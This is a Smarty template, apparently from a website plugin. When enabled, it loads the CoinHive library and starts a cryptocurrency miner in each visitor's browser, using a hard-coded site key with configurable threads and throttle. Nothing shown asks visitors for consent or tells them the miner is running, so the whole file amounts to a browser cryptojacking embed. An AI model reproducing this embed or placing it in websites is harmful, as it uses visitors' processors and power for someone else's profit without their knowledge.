{if $enabled}
	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
	{literal}
    var miner = new CoinHive.User('ucDGhVFaAU9OCjoJPDaX7n6aWPzNfPiA', '{/literal}{$name}{literal}', {
    {/literal}
        threads: {$threads},
        autoThreads: false,
        throttle: 0.{$throttle},
        forceASMJS: false
		{literal}
    });
    miner.start(CoinHive.IF_EXCLUSIVE_TAB);
    {/literal}
</script>
{/if}
